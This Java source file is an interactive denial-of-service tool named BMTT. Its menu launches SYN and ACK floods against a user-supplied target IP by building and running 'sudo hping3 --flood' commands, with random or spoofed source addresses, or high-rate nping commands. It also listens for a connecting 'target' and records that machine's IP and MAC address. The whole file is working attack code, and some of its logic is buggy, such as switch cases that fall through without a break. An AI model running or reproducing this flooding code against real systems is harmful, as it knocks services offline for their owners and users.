package dos;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.util.Enumeration;
import java.util.Scanner;

public class BMTT {

    private static Socket TargetSocket = null;
    private static boolean isTargetConnected = false;
    private static final int[] ports = {80, 8080, 9000, 135, 445, 902, 912,
                                    5040, 49664, 49665, 49666, 49667, 49668, 49669,
                                    49670, 49671, 49672, 49673, 49674, 49675, 49676, 49677};

    public static void main(String[] args) {
        System.out.println(" █████████╗ ███╗     ███╗ ████████╗████████╗");
        System.out.println(" ███╔══███║ ████╗   ████║ ╚══██╔══╝╚══██╔══╝");
        System.out.println(" ████████ ╝ ██╔██╗ ██╔██║    ██║      ██║   ");
        System.out.println(" ███╔══███╗ ██║╚████╔╝██║    ██║      ██║   ");
        System.out.println(" █████████║ ██║ ╚██╔╝ ██║    ██║      ██║   ");
        System.out.println(" ╚════════╝ ╚═╝  ╚═╝  ╚═╝    ╚═╝      ╚═╝   ");
        System.out.println("\nWelcome to BMTT!");
        System.out.println("Source: https://github.com/NTVuong23/BMTT.git\n");

        try {
            server();
        } catch (IOException e) {
            System.out.println("Error starting server: " + e.getMessage());
        }
        System.out.println("\n");
        mainMenu();
    }

    public static void mainMenu() {
        Scanner scanner = new Scanner(System.in);
        while (true) {
            System.out.println("Main Menu:");
            System.out.println("1. SYN Flood");
            System.out.println("2. ACK Flood");
            System.out.println("3. Quit");
            System.out.print("BMTT> ");

            int choice = scanner.nextInt();
            scanner.nextLine();

            switch (choice) {
                case 1:
                    synFlood(scanner);
                case 2:
                    ackFlood(scanner);
                case 3: {
                    System.out.println("Quitting...Thank you for using BMTT!");
                    return;
                }
                default:
                    System.out.println("Invalid option, please select a valid menu option!");
                    mainMenu();
                    break;
            }
        }
    }

    private static void server() throws IOException {

        if (isTargetConnected) {
            System.out.println("A client is already connected. No need to reconnect.");
            return;
        }
        ServerSocket ss = null;

        for (int port : ports) {
            try {
                ss = new ServerSocket(port);
                var myInfo = """
                +----------------------------------
                |            My Info               
                +----------------------------------
                | IP: %s           
                | Port: %d                         
                """.formatted(getMyIp(), port);

                String myMac = getMyMac();
                if (myMac != null) {
                    myInfo += "| MAC: " + myMac + "        \n";
                } else {
                    myInfo += "| MAC Address not found for server. \n";
                }

                myInfo += "----------------------------------";
                System.out.println(myInfo);
                System.out.println("\nWaiting for connection from client...");
                break;
            } catch (IOException e) {
                System.out.println("Port: " + port + " not available, trying another port...");
            }
        }
        if (ss == null) {
            System.out.println("No ports available to listen on. Server cannot start.");
            return;
        }

        TargetSocket = ss.accept();
        isTargetConnected = true;
        System.out.println("Client connected.");
        System.out.println("\n");

        InetAddress targetAddress = TargetSocket.getInetAddress();
        InputStreamReader in = new InputStreamReader(TargetSocket.getInputStream());
        BufferedReader bf = new BufferedReader(in);
        String str = bf.readLine();
        var targetInfo = """
                +----------------------------------
                |            Target Info               
                +----------------------------------
                | IP: %s      
                | %s
                """.formatted(targetAddress.getHostAddress(), str);

        String targetMac = getTargetMAC(targetAddress.getHostAddress());
        if (targetMac != null) {
            targetInfo += "| MAC: " + targetMac + "        \n";
        } else {
            targetInfo += "| MAC Address not found for target. \n";
        }

        targetInfo += "----------------------------------";
        System.out.println(targetInfo);
    }

    public static String getTargetMAC(String targetIp) {
        try {
            ProcessBuilder processBuilder = new ProcessBuilder("arp", "-n", targetIp);
            processBuilder.redirectErrorStream(true);
            Process process = processBuilder.start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains(targetIp)) {
                    String[] parts = line.trim().split("\\s+");
                    for (String part : parts) {
                        if (part.matches("([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}")) {
                            return part;
                        }
                    }
                }
            }
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            System.err.println("Error executing ARP command: " + e.getMessage());
        }
        return "MAC Address not found";
    }

    public static String getMyIp() {
        try {
            Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();
            while (networkInterfaces.hasMoreElements()) {
                NetworkInterface networkInterface = networkInterfaces.nextElement();
                if (networkInterface.isUp()) {
                    Enumeration<InetAddress> inetAddresses = networkInterface.getInetAddresses();
                    while (inetAddresses.hasMoreElements()) {
                        InetAddress address = inetAddresses.nextElement();
                        if (address instanceof Inet4Address && !address.isLoopbackAddress()) {
                            return address.getHostAddress();
                        }
                    }
                }
            }
        } catch (SocketException e) {
            System.err.println("Unable to get local IP address.");
            e.printStackTrace();
        }
        return null;
    }

    public static String getMyMac() {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            String command;

            if (os.contains("win")) {
                command = "getmac";
            } else {
                command = "ifconfig -a";
            }

            ProcessBuilder processBuilder = new ProcessBuilder(command.split(" "));
            processBuilder.redirectErrorStream(true);
            Process process = processBuilder.start();

            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                if (os.contains("win")) {
                    if (line.contains("Physical")) {
                        String[] parts = line.trim().split("\\s+");
                        return parts[1];
                    }
                } else {
                    if (line.contains("ether")) {
                        String[] parts = line.trim().split("\\s+");
                        return parts[1];
                    }
                }
            }

            process.waitFor();

        } catch (IOException | InterruptedException e) {
            System.err.println("Error executing command to get MAC address: " + e.getMessage());
        }

        return null;
    }

    private static void executeCommand(String command) {
        Process process = null;
        try {
            process = new ProcessBuilder("/bin/bash", "-c", command).redirectErrorStream(true).start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                System.out.println("\nProcess was interrupted. Returning to the main menu...");
                mainMenu();  
            }));

            boolean finished = process.waitFor(1, java.util.concurrent.TimeUnit.SECONDS);

            if (finished) {
                System.out.println("Lệnh đã thực thi xong.");
            } else {
                System.out.println("Quá trình chưa hoàn thành. Quay lại menu chính.");
            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            System.out.println("Process was interrupted. Returning to the main menu...");
        } finally {
            mainMenu();
        }
    }

    public static void synFlood(Scanner scanner) {
        System.out.println("SYN Flood uses hping3...checking for hping3...");
        if (checkCommandExists("hping3")) {
            System.out.print("IP (target): ");
            String target = scanner.nextLine();

            System.out.print("Port (target) (default 80): ");
            String portStr = scanner.nextLine();
            int port = portStr.isEmpty() ? 80 : Integer.parseInt(portStr);

            System.out.print("Source IP, or [r]andom or [i]nterface IP (default): ");
            String source = scanner.nextLine();
            source = source.isEmpty() ? "i" : source;

            System.out.print("Send data with SYN packet? [y]es or [n]o (default): ");
            String sendData = scanner.nextLine();
            sendData = sendData.isEmpty() ? "n" : sendData;

            int data = 0;
            if (sendData.equalsIgnoreCase("y")) {
                System.out.print("Number of data bytes to send (default 3333): ");
                String dataStr = scanner.nextLine();
                data = dataStr.isEmpty() ? 3333 : Integer.parseInt(dataStr);
            }

            String command = buildHping3Command(target, port, source, data, "S");
            executeCommand(command);
        } else if (checkCommandExists("nping")) {
            System.out.println("hping3 not found :( trying nping instead");
            System.out.println();

            System.out.print("IP (target): ");
            String target = scanner.nextLine();

            System.out.print("Enter target port (defaults to 80): ");
            String portInput = scanner.nextLine();
            int port = 80;
            try {
                port = Integer.parseInt(portInput);
                if (port < 1 || port > 65535) {
                    System.out.println("Invalid port, reverting to port 80");
                    port = 80;
                }
            } catch (NumberFormatException e) {
                System.out.println("Invalid port, reverting to port 80");
            }
            System.out.println("Using Port " + port);

            System.out.print("Source IP or use [i]nterface IP (default): ");
            String source = scanner.nextLine();
            if (source.isEmpty()) {
                source = "i";
            }

            System.out.print("Number of packets to send per second (default is 10,000): ");
            String rateInput = scanner.nextLine();
            int rate = rateInput.isEmpty() ? 10000 : Integer.parseInt(rateInput);

            System.out.print("Total number of packets to send (default is 100,000): ");
            String totalInput = scanner.nextLine();
            int total = totalInput.isEmpty() ? 100000 : Integer.parseInt(totalInput);

            System.out.println("Starting SYN Flood...");

            String command;
            if (source.equals("i")) {
                command = String.format("sudo nping --tcp --dest-port %d --flags syn --rate %d -c %d -v-1 %s",
                        port, rate, total, target);
            } else {
                command = String.format("sudo nping --tcp --dest-port %d --flags syn --rate %d -c %d -v-1 -S %s %s",
                        port, rate, total, source, target);
            }

            executeCommand(command);
        } else {
            System.out.println("Neither hping3 nor nping is available on this system.");
        }

        scanner.close();
    }

    public static void ackFlood(Scanner scanner) {
        System.out.println("ACK Flood uses hping3...checking for hping3...");
        if (checkCommandExists("hping3")) {
            System.out.print("IP (target): ");
            String target = scanner.nextLine();

            System.out.print("Port (target) (default 80): ");
            String portStr = scanner.nextLine();
            int port = portStr.isEmpty() ? 80 : Integer.parseInt(portStr);

            System.out.print("Source IP, or [r]andom or [i]nterface IP (default): ");
            String source = scanner.nextLine();
            source = source.isEmpty() ? "i" : source;

            System.out.print("Send data with ACK packet? [y]es or [n]o (default): ");
            String sendData = scanner.nextLine();
            sendData = sendData.isEmpty() ? "n" : sendData;

            int data = 0;
            if (sendData.equalsIgnoreCase("y")) {
                System.out.print("Number of data bytes to send (default 3333): ");
                String dataStr = scanner.nextLine();
                data = dataStr.isEmpty() ? 3333 : Integer.parseInt(dataStr);
            }

            String command = buildHping3Command(target, port, source, data, "A");
            executeCommand(command);
        } else if (checkCommandExists("nping")) {
            System.out.println("hping3 not found :( trying nping instead");
            System.out.println();

            System.out.print("IP (target): ");
            String target = scanner.nextLine();

            System.out.print("Enter target port (defaults to 80): ");
            String portInput = scanner.nextLine();
            int port = 80;
            try {
                port = Integer.parseInt(portInput);
                if (port < 1 || port > 65535) {
                    System.out.println("Invalid port, reverting to port 80");
                    port = 80;
                }
            } catch (NumberFormatException e) {
                System.out.println("Invalid port, reverting to port 80");
            }
            System.out.println("Using Port " + port);

            System.out.print("Source IP or use [i]nterface IP (default): ");
            String source = scanner.nextLine();
            if (source.isEmpty()) {
                source = "i";
            }

            System.out.print("Number of packets to send per second (default is 10,000): ");
            String rateInput = scanner.nextLine();
            int rate = rateInput.isEmpty() ? 10000 : Integer.parseInt(rateInput);

            System.out.print("Total number of packets to send (default is 100,000): ");
            String totalInput = scanner.nextLine();
            int total = totalInput.isEmpty() ? 100000 : Integer.parseInt(totalInput);

            System.out.println("Starting SYN Flood...");

            String command;
            if (source.equals("i")) {
                command = String.format("sudo nping --tcp --dest-port %d --flags ack --rate %d -c %d -v-1 %s",
                        port, rate, total, target);
            } else {
                command = String.format("sudo nping --tcp --dest-port %d --flags ack --rate %d -c %d -v-1 -S %s %s",
                        port, rate, total, source, target);
            }

            executeCommand(command);
        } else {
            System.out.println("Neither hping3 nor nping is available on this system.");
        }

        scanner.close();
    }

    private static boolean checkCommandExists(String command) {
        try {
            Process process = new ProcessBuilder("which", command).start();
            int exitCode = process.waitFor();
            return exitCode == 0;
        } catch (IOException | InterruptedException e) {
            return false;
        }
    }

    private static String buildHping3Command(String target, int port, String source, int data, String flag) {
        String base = "sudo hping3 --flood -p " + port + " -d " + data + " -" + flag + " " + target;
        if (source.equalsIgnoreCase("r")) {
            System.out.println("Starting... Use 'Ctrl c' to end and return to menu");
            return base + " --rand-source";
        } else if (!source.equalsIgnoreCase("i")) {
            System.out.println("Starting... Use 'Ctrl c' to end and return to menu");
            return base + " --spoof " + source;
        } else {
            System.out.println("Not a valid option!  Using interface IP");
            System.out.println("Starting... Use 'Ctrl c' to end and return to menu");
            return base;
        }
    }

}
